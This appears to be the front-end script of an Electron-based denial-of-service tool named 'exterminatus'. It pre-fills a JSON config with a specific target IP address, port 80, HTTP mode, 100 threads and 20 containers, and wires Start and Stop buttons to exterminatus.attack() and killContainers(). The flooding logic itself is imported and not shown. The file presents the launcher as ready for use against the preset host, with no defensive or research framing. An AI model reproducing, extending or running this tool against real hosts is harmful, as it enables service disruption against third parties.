const exterminatus = require('./exterminatus').default;
if (process.platform === 'darwin') {
  process.env.PATH = '/usr/local/bin/';
  process.env.TERM = 'vt100';
}

window.addEventListener('DOMContentLoaded', () => {
  const start = document.getElementById('start-action');
  const stop = document.getElementById('stop-action');
  const error = document.getElementById('config-error');
  const getConfigElem = () => document.getElementById('config');
  getConfigElem().value = `{ "ip": "185.72.228.100", "port": 80, "mode": "http", "threads": 100, "containers": 20 }`;

  function getValues() {
    return getConfigElem().value;
  }

  function onUpdate () {
    try {
      JSON.parse(getValues());
      error.classList.add('hidden');
    } catch (err) {
      error.classList.remove('hidden');
      console.error(err);
    }
  }

  getConfigElem().addEventListener('change', () => onUpdate());
  getConfigElem().addEventListener('keyup', () => onUpdate());
  
  start.addEventListener('click', () => {
    const config = JSON.parse(getValues());
    exterminatus.attack(config);
  });

  stop.addEventListener('click', () => {
    exterminatus.killContainers();
  });

  document.addEventListener('START', () => {
    start.classList.add('disabled');
    start.disabled = true;
  });

  document.addEventListener('STOP', () => {
    start.classList.remove('disabled');
    start.disabled = false;
  });

  document.addEventListener('START_SUCCESS', () => {
    start.classList.remove('disabled');
    start.disabled = false;
  });
});